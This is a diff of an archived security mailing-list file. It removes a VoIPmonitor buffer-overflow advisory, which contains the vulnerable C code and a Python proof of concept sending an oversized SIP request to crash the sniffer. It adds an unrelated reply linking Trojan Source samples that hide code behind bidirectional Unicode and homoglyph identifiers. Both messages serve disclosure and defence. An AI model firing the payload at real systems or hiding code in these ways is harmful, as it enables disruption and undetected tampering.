@@ -1,106 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/15/2
-Message-Id: <118b1bd8-5278-4e9c-8941-41dc4495178d@www.fastmail.com>
-Date: Mon, 15 Mar 2021 13:48:26 +0100
-From: "Sandro Gauci" <sandro@...blesecurity.com>
-To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com, fulldisclosure@...lists.org, voipsec@...psa.org, submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org
-Subject: ES2021-03: VoIPmonitor is vulnerable to a buffer overflow when using the live sniffer
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/11/02/12
+Message-ID: <20211102232554.GA3040970@millbarge>
+Date: Tue, 2 Nov 2021 23:25:54 +0000
+From: Seth Arnold <seth.arnold@...onical.com>
+To: Stuart D Gathman <stuart@...hman.org>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Trojan Source Attacks
 Content-Type: text/plain; charset=utf-8
 
-# VoIPmonitor is vulnerable to a buffer overflow when using the live sniffer
+On Tue, Nov 02, 2021 at 04:43:48PM -0400, Stuart D Gathman wrote:
+> Having some sample source files to test your code editor/viewer on would be
+> helpful.
 
-- Fixed versions: 27.6
-- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-03-voipmonitor-livesniffer-buffer-overflow
-- VoIPmonitor Security Advisory: none, changelog references fixes at https://www.voipmonitor.org/changelog-sniffer
-- Tested vulnerable versions: 27.5
-- Timeline:
-    - Report date: 2021-02-10
-	- Triaged: 2021-02-12
-	- Fix provided for testing: 2021-02-15
-	- VoIPmonitor release with fix: 2021-02-15
-	- Enable Security advisory: 2021-03-15
+There's examples on https://github.com/nickboucher/trojan-source
 
-## Description
+GitHub was kind enough to include a banner like this on many of the files:
 
-A buffer overflow was identified in the VoIPmonitor live sniffer feature. The description variable in the function `save_packet_sql` is defined as a fixed length array of 1024 characters. The description is set to the value of a SIP request or response line. By setting a long request or response line VoIPmonitor will trigger a buffer overflow. The affected code is:
+     This file contains bidirectional Unicode text that may be interpreted
+     or compiled differently than what appears below. To review, open
+     the file in an editor that reveals hidden Unicode characters. Learn
+     more about bidirectional Unicode characters
 
-```c
-char callidstr[1024] = "";
-if(packetS->sipDataLen) {
-    void *memptr = memmem(packetS->data_()+ packetS->sipDataOffset, 
-        packetS->sipDataLen, "\r\n", 2);
-    if(memptr) {
-        memcpy(description, packetS->data_()+ packetS->sipDataOffset, 
-            (char *)memptr - (char*)(packetS->data_()+ packetS->sipDataOffset));
-        description[(char*)memptr - (char*)(packetS->data_()+ 
-            packetS->sipDataOffset)] = '\0';
-        printf("%s\n", description);
-    }
-    // ...
-}
-```
-
-## Impact
-
-When using the static binaries provided at the VoIPMonitor download site, this vulnerability may lead to remote code execution. This is due to lack of standard memory corruption protection as explained in a separate advisory, ES2021-04-voipmonitor-staticbuild-memory-corruption-protection.
-
-When compiling the `voipmonitor` program from source, most modern build systems will automatically include run-time best practice checks. In such cases, it appears that the worst-case-scenario is that the program will end up crashing.
-
-## How to reproduce the issue
-
-1. Start the live sniffer from the VOIPMonitor GUI
-2. Execute the following Python program so that VOIPMonitor is able to capture the packet
-3. Observe that VOIPMonitor has crashed
-
-```python
-import socket
-msg='REGISTER %s SIP/2.0\r\n' % ('a' * 1024)
-msg+='Via: SIP/2.0/UDP 192.168.1.132:35393;rport;branch=z9hG4bK-kwtTkrdNAO2Wvw0v\r\n'
-msg+='Max-Forwards: 70\r\n'
-msg+='From: <sip:85861710@...o.sipvicious.pro>;tag=mnq1nKGNZHNUkNOG\r\n'
-msg+='To: <sip:85861710@...o.sipvicious.pro>\r\n'
-msg+='Call-ID: 93X9dNZO2qdcfpdu\r\n'
-msg+='CSeq: 1 REGISTER\r\n'
-msg+='Contact: <sip:85861710@....168.1.132:35393;transport=udp>\r\n'
-msg+='Expires: 60\r\n'
-msg+='Content-Length: 0\r\n'
-msg+='\r\n'
-
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.sendto(msg.encode(), ('demo.sipvicious.pro', 5060))
-```
-
-## Solution and recommendations
-
-To address this issue, we recommend upgrading to the latest fixed version of VoIPmonitor.
-
-We recommended the following to the vendor:
-
-> The length of the value that the description is being set to should be checked before it is copied into memory. The pattern `memcpy(dest, src, MIN(src_len, max_len));` could be used to safely perform this operation.
-
-## Acknowledgements
-
-Enable Security would like to thank Martin Vit and the developers at VoIPmonitor for the very quick response and fixing this security issue.
-
-## About Enable Security
-
-Enable Security develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.
-
-## Disclaimer
-
-The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
-
-## Disclosure policy
-
-This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.
+eg: https://github.com/nickboucher/trojan-source/blob/main/Go/stretched-string.go
 
 
---
- 
-    Sandro Gauci, CEO at Enable Security GmbH
+But not all of them:
 
-    Register of Companies:       AG Charlottenburg HRB 173016 B
-    Company HQ:                       Neuburger Straße 101 b, 94036 Passau, Germany
-    PGP/Encrypted comms:       https://keybase.io/sandrogauci
-    Our blog:                                https://www.rtcsec.com
-    Other points of contact:       https://enablesecurity.com/#contact-us
+https://github.com/nickboucher/trojan-source/blob/main/Go/homoglyph-function.go
+Looks completely normal to me, but mouse hovering over the sayHello
+function names shows the difference.
+
+https://github.com/nickboucher/trojan-source/blob/main/Rust/invisible-function.rs
+The isAdmin function name is rendered three different ways, but it's
+pretty subtle, and the colouring gives no indication which of the two
+definitions is actually going to be used (though I've got a guess).
+
+There's otherwise no warnings today from GitHub that these two are out
+of the ordinary.
+
+Thanks
+
+Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
